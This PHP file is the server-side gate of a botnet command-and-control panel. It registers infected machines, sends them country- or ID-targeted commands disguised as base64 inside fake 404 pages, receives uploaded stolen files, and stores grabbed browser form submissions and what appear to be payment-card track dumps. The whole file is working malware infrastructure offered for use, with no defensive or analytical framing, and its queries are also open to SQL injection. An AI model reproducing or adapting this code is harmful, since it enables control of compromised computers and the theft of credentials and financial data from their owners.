<?php
header('Content-Type: text/html; charset=utf8');
define('N3N', 1);
include("config.php");
include("functions.php");
$real_ip = null;

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

if (!isset($_POST['ip'])) {
    $real_ip = $_SERVER['REMOTE_ADDR'];
} else {
    $real_ip = $_POST['ip'];
}

ConnectMySQL($db_host, $db_login, $db_password, $db_database);

if ($_SERVER["REQUEST_METHOD"] != "POST") {
    AddBan($real_ip);
}

CheckBotUserAgent($real_ip);
CheckBan($real_ip);
if (isset($_POST['cmd'])) {

    $time = time();
    $date = date('Y-m-d H:i:s');

    $bot_ip = $real_ip;
    $bot_os = $_POST['os'];
    $bot_name = urlencode($_POST['uid']);

    $bot_uid = md5($bot_os . $bot_name);

    $bot_time = $time;
    $bot_date = $date;

    $bot_av = strip_data($_POST['av']);
    $bot_version = strip_data($_POST['version']);
    $bot_quality = intval($_POST['quality']);

    $gi = geoip_open("GeoIP/GeoIP.dat", GEOIP_STANDARD);
    $bot_country = geoip_country_code_by_addr($gi, $bot_ip);
    if ($bot_country == null) {
        $bot_country = "O1";
    }
    geoip_close($gi);

    if ($_POST['quality'] == 0)
        $bot_quality = "green";
    else if ($_POST['quality'] < 3)
        $bot_quality = "yellow";
    else  $bot_quality = "red";

    if (!empty($_POST['layer'])) {
        $layer_url = $_POST['layer'];
        $layer_cktime = $time;
        $layer_ckdate = $date;
        $sql = "REPLACE INTO p_layer (layer_url, layer_cktime, layer_ckdate) VALUES ('$layer_url', '$layer_cktime', '$layer_ckdate')";
        mysql_query($sql);
    }

    $sql = "REPLACE INTO botnet_bots (bot_uid, bot_os, bot_name, bot_ip, bot_time, bot_date, bot_av, bot_country, bot_version, bot_quality)
			       VALUES ('$bot_uid', '$bot_os', '$bot_name', '$bot_ip', '$bot_time', '$bot_date', '$bot_av', '$bot_country', '$bot_version', '$bot_quality')";
    mysql_query($sql);

    $sql = "SELECT task_id, execs, needexecs, bots, tasks_pref, command, tasks_postf FROM botnet_tasks WHERE status = '1'";
    $res = mysql_query($sql);

    $command = refresh_rate("get_cc", null);
    if ($res) {
        $rows = mysql_num_rows($res);
        if ($rows) {
            for ($i = 0; $i < $rows; $i++) {
                $row = mysql_fetch_assoc($res);
                if ($row['needexecs'] != 0 && $row['execs'] == $row['needexecs']) {
                    $sql = "UPDATE botnet_tasks SET status='0' WHERE task_id = '" . addslashes($row['task_id']) . "'";
                    mysql_query($sql);
                } else {
                    $bot = $row['bots'];
                    if (strlen($bot) == 2 && $bot == $bot_country) {
                        $command .= $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }

                    if (strlen($bot) == 35 && $bot == "ID:$bot_uid") {
                        $command .= $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }
                    if (strlen($bot) == 3) {
                        $command .= $row['tasks_pref'] . $row['command'] . $row['tasks_postf'];
                    }
                }
            }
        }

        header("HTTP/1.0: 404 Not Found");
        die (
            "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" .
            "<HTML>" .
            "<HEAD>" .
            "<TITLE>404 Not Found</TITLE>" .
            "</HEAD>" .
            "<BODY>" .
            "<H1>Not Found</H1>" .
            "The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server." .
            "</BODY>" .
            "</HTML>" .
            "<!-- " . $key_start . base64_encode($command) . $key_end . " -->"
        );
    }
}
if (isset($_POST['fail'])) {
    $task_id = $_POST['task_id'];
    mysql_query("UPDATE botnet_tasks SET failed = `failed`+1 WHERE task_id = '$task_id'");
    NotFound();
}
if (isset($_POST['exec'])) {
    $task_id = $_POST['task_id'];
    mysql_query("UPDATE botnet_tasks SET execs = `execs`+1 WHERE task_id = '$task_id'");
    NotFound();
}
if ($_SERVER["CONTENT_TYPE"] != "application/x-www-form-urlencoded") {
    $dirname = '';
    $ext = pathinfo($_FILES['data']['name'], PATHINFO_EXTENSION);
    if ($ext == 'rar')
        $dirname = 'logs';
    else
        $dirname = 'files';
    UploadFile($dirname);
    NotFound();
}
if (isset($_POST['ff'])) {
    if (isFFEnabled() == true) {
        if (isFFGrabbing() == true) {
            if (isHostBlocked() == false) {
                $bot_ip = $real_ip;
                $bot_uid = strip_data($_POST['uid']);;
                $bot_host = strip_data($_POST['host']);
                $bot_browser = strip_data($_POST['browser']);
                $bot_form = $_POST['form'];
                $bot_form_hash = md5($bot_form);

                $bot_date = date('Y-m-d');
                $bot_time = date('H:i:s');

                $sql = "REPLACE INTO botnet_ff (bot_ip, bot_uid, bot_host, bot_form, bot_form_hash, bot_browser, bot_date, bot_time)
			       VALUES ('$bot_ip', '$bot_uid', '$bot_host', '$bot_form', '$bot_form_hash', '$bot_browser', '$bot_date', '$bot_time')";
                mysql_query($sql);
            }
        }
    }
    NotFound();
}
if (isset($_POST['d'])) {
    $bot_ip = $real_ip;
    $track_type = strip_data($_POST['type']);
    $track_data = base64_encode(strip_data($_POST['data']));
    $track_hash = md5($track_data);

    $bot_date = date('Y-m-d');
    $bot_time = date('H:i:s');

    $sql = "REPLACE INTO botnet_dumps (bot_ip, track_type, track_data, bot_date, bot_time, track_hash)
			       VALUES ('$bot_ip', '$track_type', '$track_data', '$bot_date', '$bot_time', '$track_hash')";
    mysql_query($sql);
    NotFound();
}
if (isset($_POST['auth'])) {
    header("HTTP/1.0: 404 Not Found");
    die (
        "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" .
        "<HTML>" .
        "<HEAD>" .
        "<TITLE>404 Not Found</TITLE>" .
        "</HEAD>" .
        "<BODY>" .
        "<H1>Not Found</H1>" .
        "The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server." .
        "</BODY>" .
        "</HTML>" .
        "<!-- " . $key_start . base64_encode("pong") . $key_end . " -->"
    );
}
AddBan($real_ip);